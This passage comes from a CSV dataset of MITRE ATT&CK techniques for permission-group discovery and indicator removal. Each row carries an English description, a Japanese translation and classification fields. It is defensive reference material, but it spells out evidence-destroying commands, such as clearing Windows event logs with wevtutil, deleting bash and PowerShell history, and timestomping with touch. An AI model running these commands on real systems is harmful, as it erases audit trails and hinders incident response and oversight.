Transfer](https://attack.mitre.org/techniques/T1570).",攻撃者は権限昇格を試みるため、ソフトウェアの脆弱性を悪用する可能性がある。ソフトウェア脆弱性の悪用とは、攻撃者がプログラム、サービス、あるいはオペレーティングシステムソフトウェアやカーネル自体に存在するプログラミング上の誤りを悪用し、攻撃者が制御するコードを実行することを指す。権限レベルなどのセキュリティ構造は、情報へのアクセスや特定の手法の使用を妨げる場合が多いため、攻撃者はこれらの制限を回避するために、ソフトウェア悪用を含む権限昇格を実行する必要が生じる可能性が高い。 システムへの初期アクセス時、攻撃者は低権限プロセス内で動作している可能性があり、これによりシステム上の特定リソースへのアクセスが制限される。通常は高権限で動作するOSコンポーネントやソフトウェアに存在する脆弱性を悪用することで、システム上でより高いアクセス権限を獲得できる。これにより、脆弱なコンポーネントによっては、非特権ユーザー権限からSYSTEM権限やroot権限への移行が可能となる。 また、仮想マシンやコンテナなどの仮想化環境から基盤となるホストへ移行することも可能になる。これは、適切に構成され他の権限昇格手法が制限されているエンドポイントシステムを侵害する攻撃者にとって必要なステップとなる場合がある。 攻撃者は、署名付き脆弱ドライバーを侵害マシンに持ち込み、カーネルモードでコードを実行するために脆弱性を悪用することがあります。この手法は「Bring Your Own Vulnerable Driver（BYOVD）」と呼ばれることもあります。（引用元：ESET InvisiMole 2020年6月）(引用元: Unit42 AcidBox 2020年6月)攻撃者は、脆弱なドライバを初期アクセス時に配信するファイルに含めるか、[侵入ツール転送](https://attack.mitre.org/techniques/T1105)または[横方向ツール転送](https://attack.mitre.org/techniques/T1570)を介して侵害システムにダウンロードする可能性があります。,privilege-escalation,Containers;Linux;Windows;macOS,data_exfiltration,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0004,attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839,2017-05-31T21:30:55.066Z,2025-04-15T19:58:58.811Z,,,,
T1069,,Permission Groups Discovery,権限グループの発見,"Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions. Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)",攻撃者はグループおよび権限設定の発見を試みる可能性がある。この情報は、利用可能なユーザーアカウントとグループ、特定のグループへのユーザーの所属、および昇格された権限を持つユーザーとグループを攻撃者が特定するのに役立つ。 攻撃者は様々な方法でグループ権限設定の発見を試みる可能性があります。このデータは、攻撃者が侵害された環境に関する情報を入手し、その後の活動や標的選定に利用する可能性があります。(引用元: CrowdStrike BloodHound 2018年4月),discovery,Windows;SaaS;IaaS;Linux;macOS;Containers;Office Suite;Identity Provider,config_policy_manipulation,situational_awareness,privileged_account;user_interaction,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce,2017-05-31T21:30:55.471Z,2025-04-15T22:56:59.585Z,,,,
T1069.001,T1069,Local Groups,ローカルグループ,"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group. Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",攻撃者はローカルシステムグループと権限設定の特定を試みる可能性があります。ローカルシステム権限グループに関する知識は、攻撃者がどのグループが存在し、特定のグループにどのユーザーが所属しているかを判断するのに役立ちます。攻撃者はこの情報を用いて、ローカル管理者グループ内のユーザーなど、昇格された権限を持つユーザーを特定することが可能です。 ローカルグループを一覧表示するコマンドには、[Net](https://attack.mitre.org/software/S0039)ユーティリティの<code>net localgroup</code>、macOSの<code>dscl . -list /Groups</code>、Linuxの<code>groups</code>などがある。,discovery,Linux;macOS;Windows,script_command_execution,situational_awareness,privileged_account;user_interaction;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b,2020-03-12T19:29:21.013Z,2025-04-15T22:46:25.458Z,,,,
T1069.002,T1069,Domain Groups,ドメイングループ,"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators. Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",攻撃者は、ドメインレベルのグループや権限設定を見つけ出そうとする可能性があります。ドメインレベルの権限グループに関する知識は、攻撃者がどのグループが存在し、どのユーザーが特定のグループに属しているかを判断するのに役立ちます。 攻撃者はこの情報を利用して、ドメイン管理者など、昇格された権限を持つユーザーを特定する可能性があります。[Net](https://attack.mitre.org/software/S0039) ユーティリティの <code>net group /domain</code>、macOS の <code>dscacheutil -q group</code>、Linux の <code>ldapsearch</code> などのコマンドは、ドメインレベルのグループを一覧表示できます。,discovery,Linux;macOS;Windows,credential_abuse,situational_awareness,authentication_system;privileged_account;user_interaction;endpoint_execution,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c,2020-02-21T21:15:06.561Z,2025-04-15T22:22:08.417Z,,,,
T1069.003,T1069,Cloud Groups,クラウドグループ,"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group. With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance). Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.","攻撃者はクラウドグループと権限設定の特定を試みる可能性があります。クラウド権限グループに関する知識は、環境内のユーザーやグループの具体的な役割、および特定のグループに関連付けられているユーザーを攻撃者が特定するのに役立ちます。認証済みアクセス環境では、権限グループを特定するために使用できるツールがいくつか存在します。 <code>Get-MsolRole</code> PowerShellコマンドレットは、ExchangeおよびOffice 365アカウントのロールと権限グループを取得するために使用できます（引用元: Microsoft Msolrole）（引用元: GitHub Raindance）。 Azure CLI（AZ CLI）とGoogle Cloud Identity Provider APIも権限グループを取得するインターフェースを提供します。Azureではコマンド<code>az ad user get-member-groups</code>がユーザーアカウントに関連付けられたグループを一覧表示し、GoogleではAPIエンドポイント<code>GET https://cloudidentity.googleapis.com/v1/groups</code>がユーザーが利用可能なグループリソースを一覧表示します。(引用元: Microsoft AZ CLI)(引用元: Black Hills Red Teaming MS AD Azure, 2018)(引用元: Google Cloud Identity API Documentation) AWSでは、`ListRolePolicies`および`ListAttachedRolePolicies`コマンドにより、ロールに紐付けられたポリシーを列挙できます。(引用元: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) 攻撃者は、AWS の <code>GetBucketAcl</code> API (引用元: AWS Get Bucket ACL) などを利用して、オブジェクトの ACL を一覧表示し、そのオブジェクトへのアクセス権を持つ所有者やその他のアカウントを特定しようとする可能性があります。 この情報を使用して、攻撃者は特定のオブジェクトに対する権限を持つアカウントを標的にしたり、すでに侵害したアカウントを利用してオブジェクトにアクセスしたりすることができます。",discovery,SaaS;IaaS;Office Suite;Identity Provider,credential_abuse,situational_awareness,authentication_system;identity_federation;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;saas_in_use;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2,2020-02-21T21:15:33.222Z,2025-04-15T22:02:13.319Z,,,,
T1070,,Indicator Removal,指標の除去,"Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform. Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",攻撃者は、自身の存在の証拠を消去したり防御を妨害したりするため、システム内で生成されたアーティファクトを削除または改変する可能性があります。攻撃者によって生成される、または攻撃者の行動に起因するとみなされる様々なアーティファクトが存在します。通常、これらのアーティファクトは監視対象イベントに関連する防御指標として使用されます。例としては、ダウンロードされたファイル内の文字列、ユーザー操作から生成されるログ、防御者が分析するその他のデータなどが挙げられます。 アーティファクト（コマンド履歴やログイン履歴など）の場所、形式、種類は、各プラットフォームごとに固有であることが多い。これらの指標の除去は、侵入活動の検出に使用されるイベント収集、報告、その他のプロセスを妨害する可能性がある。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの完全性が損なわれる恐れがある。また、発生した事象を判断するのに十分なデータが不足するため、フォレンジック分析やインシデント対応を妨げる可能性もある。,defense-evasion,Linux;macOS;Windows;Containers;Network Devices;Office Suite;ESXi,script_command_execution,stealth,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69,2017-05-31T21:30:55.892Z,2025-04-15T19:58:43.436Z,,,,
T1070.001,T1070,Clear Windows Event Logs,Windowsイベントログの消去,"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit. With administrator privileges, the event logs can be cleared with the following utility commands: * <code>wevtutil cl system</code> * <code>wevtutil cl application</code> * <code>wevtutil cl security</code> These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging) Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\Windows\System32\winevt\logs\`.",攻撃者は侵入活動を隠蔽するため、Windows イベントログを消去する場合がある。Windows イベントログはコンピュータのアラートと通知の記録である。システム定義のイベントソースは3種類（システム、アプリケーション、セキュリティ）あり、イベントタイプは5種類（エラー、警告、情報、成功監査、失敗監査）に分類される。 管理者権限があれば、以下のユーティリティコマンドでイベントログを消去できます：* <code>wevtutil cl system</code>* <code>wevtutil cl application</code>* <code>wevtutil cl security</code>これらのログは、イベントビューアーGUIや[PowerShell](https://attack.mitre.org/techniques/T1059/001)などの他のメカニズムでも消去可能です。。例えば、攻撃者はPowerShellコマンド<code>Remove-EventLog -LogName Security</code>を使用してセキュリティイベントログを削除し、再起動後に将来のログ記録を無効化することがあります。 注: コマンド実行から再起動までの間に、イベントが生成され .evtx ファイルに記録される可能性があります。(引用元: disable_win_evt_logging) 攻撃者は `C:\Windows\System32\winevt\logs\` 内の保存済みログファイルを直接削除してログを消去しようとする場合もあります。,defense-evasion,Windows,script_command_execution,stealth,privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2,2020-01-28T17:05:14.707Z,2025-04-15T19:58:36.700Z,,,,
T1070.002,T1070,Clear Linux or Mac System Logs,Linux または Mac システムログの消去,"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs) * <code>/var/log/messages:</code>: General and system-related messages * <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs * <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records * <code>/var/log/kern.log</code>: Kernel logs * <code>/var/log/cron.log</code>: Crond logs * <code>/var/log/maillog</code>: Mail server logs * <code>/var/log/httpd/</code>: Web server access and error logs",攻撃者は侵入の痕跡を隠すためシステムログを消去する可能性があります。macOSとLinuxはシステムログを通じてシステムまたはユーザーによる操作を記録します。ネイティブシステムログの大部分は<code>/var/log/</code>ディレクトリ下に保存されます。このディレクトリのサブフォルダは関連機能別にログを分類しており、例：(引用元: Linux Logs)* <code>/var/log/messages:</code>: 一般的なシステム関連メッセージ * <code>/var/log/secure</code> または <code>/var/log/auth.log</code>: 認証ログ * <code>/var/log/utmp</code> または <code>/var/log/wtmp</code>: ログイン記録 * <code>/var/log/kern.log</code>: カーネルログ * <code>/var/log/cron.log</code>: crondログ * <code>/var/log/maillog</code>: メールサーバログ * <code>/var/log/httpd/</code>: Webサーバアクセスおよびエラーログ,defense-evasion,Linux;macOS,other,stealth,authentication_system;user_interaction;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36,2020-01-28T17:11:54.034Z,2025-04-15T21:56:45.103Z,,,,
T1070.003,T1070,Clear Command History,コマンド履歴の消去,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, command history may be manually removed from the `/var/log/shell.log` file.(Citation: Broadcom ESXi Shell Audit) On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends. The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History) Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",システムログの消去に加え、攻撃者は侵入中に実行した操作を隠蔽するため、侵害されたアカウントのコマンド履歴を消去する場合があります。各種コマンドインタプリタは、ユーザーがターミナルで入力したコマンドを追跡し、操作の追跡を可能にします。LinuxおよびmacOSでは、これらのコマンド履歴にいくつかの方法でアクセスできます。 ログイン中は、このコマンド履歴は環境変数<code>HISTFILE</code>が指すファイルに追跡されます。ユーザーがシステムからログオフすると、この情報はユーザーのホームディレクトリにある<code>~/.bash_history</code>というファイルに書き出されます。これにより、ユーザーは異なるセッションで以前に使用したコマンドを再利用できるようになります。 攻撃者は履歴を手動でクリアする（`history -c`）か、bash履歴ファイルを削除する（`rm ~/.bash_history`）ことで、これらのログから自身のコマンドを消去する可能性があります。 攻撃者はネットワーク機器上の[ネットワーク機器CLI](https://attack.mitre.org/techniques/T1059/008)を利用してコマンド履歴データを消去することも可能です（<code>clear logging</code>および/または<code>clear history</code>）。(引用: US-CERT-TA18-106A) ESXiサーバーでは、コマンド履歴が`/var/log/shell.log`ファイルから手動で削除される可能性があります。(引用: Broadcom ESXi Shell Audit) Windowsホストでは、PowerShellには2種類のコマンド履歴プロバイダーがあります：組み込みの履歴と、<code>PSReadLine</code>モジュールによって管理されるコマンド履歴です。 組み込み履歴は現在のセッションで使用されたコマンドのみを追跡します。このコマンド履歴は他のセッションでは利用できず、セッション終了時に削除されます。<code>PSReadLine</code>コマンド履歴はすべてのPowerShellセッションで使用されたコマンドを追跡し、ファイル（デフォルトでは<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>）に書き込みます。 この履歴ファイルは全セッションで利用可能であり、セッション終了時に削除されないため過去の全履歴を含みます。(引用元: Microsoft PowerShell コマンド履歴)攻撃者はPowerShellコマンド<code>Clear-History</code>を実行し、現在のPowerShellセッションから全コマンド履歴を消去する可能性があります。ただし、これは<code>ConsoleHost_history.txt</code>ファイルを削除/消去しません。 攻撃者は、実行したPowerShellコマンドを隠蔽するため、<code>ConsoleHost_history.txt</code>ファイルを削除したり内容を改ざんしたりする可能性があります。（出典: Sophos PowerShell command audit）（出典: Sophos PowerShell Command History Forensics）,defense-evasion,Linux;macOS;Windows;Network Devices;ESXi,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a,2020-01-31T12:32:08.228Z,2025-04-15T19:58:23.774Z,,,,
T1070.004,T1070,File Deletion,ファイル削除,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and `rm` on ESXi.",攻撃者は侵入活動で残されたファイルを削除する可能性があります。攻撃者がシステムにドロップまたは作成したマルウェア、ツール、その他の非ネイティブファイル（例：[侵入ツール転送](https://attack.mitre.org/techniques/T1105)）は、ネットワーク内で何が行われ、どのように行われたかを示す痕跡を残す可能性があります。 これらのファイルの削除は、侵入中に発生する可能性があり、また侵入後のプロセスの一環として、攻撃者の痕跡を最小限に抑えるために実施される場合もある。ホストオペレーティングシステムにはクリーンアップを実行するツールが用意されているが、攻撃者は他のツールを使用する場合もある。（引用元：Microsoft SDelete 2016年7月）組み込みの[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)関数の例としては、Windowsの<code>del</code>、LinuxおよびmacOSの<code>rm</code>または<code>unlink</code>、ESXiの`rm`などがあります。,defense-evasion,Linux;macOS;Windows;ESXi,script_command_execution,stealth,mfa_in_use;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c,2020-01-31T12:35:36.479Z,2025-04-15T19:59:12.733Z,,,,
T1070.005,T1070,Network Share Connection Removal,ネットワーク共有接続の削除,Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. (Citation: Technet Net Use),攻撃者は、操作の痕跡を消去するために、不要になった共有接続を削除する可能性があります。Windows共有ドライブや[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)接続は、不要になった時点で削除できます。 [Net](https://attack.mitre.org/software/S0039) は、<code>net use \\system\share /delete</code> コマンドでネットワーク共有接続を削除できるユーティリティの一例です。(引用元: Technet Net Use),defense-evasion,Windows,remote_service_abuse,stealth,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c,2020-01-31T12:39:18.816Z,2025-04-16T20:37:18.727Z,,,,
T1070.006,T1070,Timestomp,タイムスタンプ,"Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files. In Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet Forensics) Modifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.(Citation: Inversecos Timestomping 2022) Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in “double timestomping Eby modifying times on both attributes simultaneously.(Citation: Double Timestomping) In Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as `touch -a -m -t <timestamp> <filename>` (which sets access and modification times to a specific value) or `touch -r <filename> <filename>` (which sets access and modification times to match those of another file).(Citation: Inversecos Linux Timestomping)(Citation: Juniper Networks ESXi Backdoor 2022) Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)",攻撃者は、新しいファイルや既存ファイルの変更を隠すためにファイルの時刻属性を改ざんすることがあります。タイムスタンプ改ざん（Timestomping）は、ファイルのタイムスタンプ（変更時刻、アクセス時刻、作成時刻、更新時刻）を改変する手法であり、同じフォルダ内のファイルを模倣し、悪意のあるファイルを正当なファイルに紛れ込ませる目的で用いられることがよくあります。 Windowsシステムでは、`$STANDARD_INFORMATION`（`$SI`）と`$FILE_NAME`（`$FN`）の両属性がマスターファイルテーブル（MFT）ファイルに時刻を記録します。（引用元：Inversecos Timestomping 2022）`$SI`（日付/タイムスタンプ）はファイルシステムビューを含むエンドユーザーに表示される一方、`$FN`はカーネル側で処理される。（引用元：Magnet Forensics）`$SI`属性の改変は、API呼び出しによるユーザーレベルでの変更が可能なため、タイムスタンプ改ざんで最も一般的な手法である。 一方、`$FN`のタイムスタンプ改ざんには通常、システムカーネルとの連携、またはファイルの移動・リネームが必要となる。(引用: Inversecos Timestomping 2022) 攻撃者は、フォレンジック調査員やファイル解析ツールに不審がられないよう、ファイルのタイムスタンプを改ざんする。 `$SI`と`$FN`属性の不一致を検知する手法を回避するため、攻撃者は両属性の時刻を同時に改変する「二重タイムスタンプ改ざん」を行う場合もある。(引用: Double Timestomping) LinuxシステムやESXiサーバーでは、脅威アクターが`touch -a -m -t <timestamp> <filename>`（アクセス/変更時刻を特定値に設定）や`touch -r <filename> <filename>`（アクセス/変更時刻を別ファイルと一致させる）などのコマンドでタイムスタンプ改ざんを試みる可能性がある。(引用: Inversecos Linux Timestomping)(引用: Juniper Networks ESXi Backdoor 2022) タイムスタンプ改ざんは、ファイル名偽装[Masquerading](https://attack.mitre.org/techniques/T1036)と組み合わせてマルウェアやツールを隠蔽するために使用される可能性がある。(引用: WindowsIR Anti-Forensic Techniques),defense-evasion,Linux;macOS;Windows;ESXi,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611,2020-01-31T12:42:44.103Z,2025-04-15T19:58:27.752Z,,,,
T1070.007,T1070,Clear Network Connection History and Configurations,ネットワーク接続履歴と設定の消去,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries. Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal): * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code> Windows may also store information about recent RDP connections in files such as <code>C:\Users\\%username%\Documents\Default.rdp</code> and `C:\Users\%username%\AppData\Local\Microsoft\Terminal Server Client\Cache\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing) Malicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",攻撃者は、悪意のあるネットワーク接続の痕跡を消去し、操作の痕跡を消すために、悪意のあるネットワーク接続の証拠を消去または削除する可能性があります。 [リモートサービス](https://attack.mitre.org/techniques/T1021) や [外部リモートサービス](https://attack.mitre.org/techniques/T1133) など、ネットワーク接続を必要とする動作により、システム上および/またはアプリケーションログに、設定や接続履歴を示す様々なアーティファクトが生成される可能性がある。 防御側はこれらの痕跡を利用して、攻撃者が作成したネットワーク接続を監視または分析できます。ネットワーク接続履歴は様々な場所に保存される可能性があります。例えば、RDP接続履歴はWindowsレジストリ値の以下の場所に保存される場合があります。 (引用元: Microsoft RDP Removal): * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code> Windowsはまた、最近のRDP接続に関する情報を<code>C:\Users\\%username%\Documents\Default.rdp</code> や `C:\Users\%username%\AppData\Local\Microsoft\Terminal Server Client\Cache\` などのファイルに保存される場合があります。(引用元: Moran RDPieces) 同様に、macOS および Linux ホストでは、接続履歴を示す情報がシステムログ（`/Library/Logs` や `/var/log/` に保存されるものなど）に保存される場合があります。(引用元: Apple Culprit Access)(引用元: FreeDesktop Journal)(引用元: Apple Unified Log Analysis Remote Login and Screen Sharing) 悪意のあるネットワーク接続は、サードパーティ製アプリケーションやネットワーク設定の変更を必要とする場合もあります。例えば、[システムファイアウォールの無効化または変更](https://attack.mitre.org/techniques/T1562/004) や、[プロキシ](https://attack.mitre.org/techniques/T1090) を有効化するための改ざんなどです。 攻撃者は、指標を隠蔽したり防御分析を妨害したりするために、このデータを削除または改変する可能性があります。,defense-evasion,Linux;macOS;Windows;Network Devices,remote_service_abuse,stealth,authentication_system;user_interaction;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc,2022-06-15T18:00:04.219Z,2025-04-16T20:37:16.734Z,,,,
